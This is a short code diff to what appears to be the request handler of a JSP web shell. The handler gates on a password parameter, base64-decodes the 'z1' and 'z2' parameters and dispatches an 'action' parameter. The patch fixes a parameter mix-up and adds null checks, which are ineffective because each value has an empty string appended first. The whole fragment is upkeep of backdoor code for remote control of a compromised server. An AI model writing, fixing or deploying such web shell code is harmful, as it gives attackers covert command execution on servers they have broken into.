@@ -243,10 +243,16 @@
 if (request.getParameter(Pwd) != null) {
 
 	try {
-        String t1 = request.getParameter("z1");
-        String t2 = request.getParameter("z1");
-        String z1b = new String((new BASE64Decoder()).decodeBuffer(t1));
-        String z2b = new String((new BASE64Decoder()).decodeBuffer(t2));
+        String t1 = request.getParameter("z1")+"";
+        String t2 = request.getParameter("z2")+"";
+        String z1b = "";
+        String z2b = "";
+        if(t1 !=null){
+            z1b = new String((new BASE64Decoder()).decodeBuffer(t1));
+        }
+        if(t2 !=null){
+            z2b = new String((new BASE64Decoder()).decodeBuffer(t2));
+        }
 		String Z = EC(request.getParameter("action") + "");
 		String z1 = EC(z1b + "");
 		String z2 = EC(z2b + "");
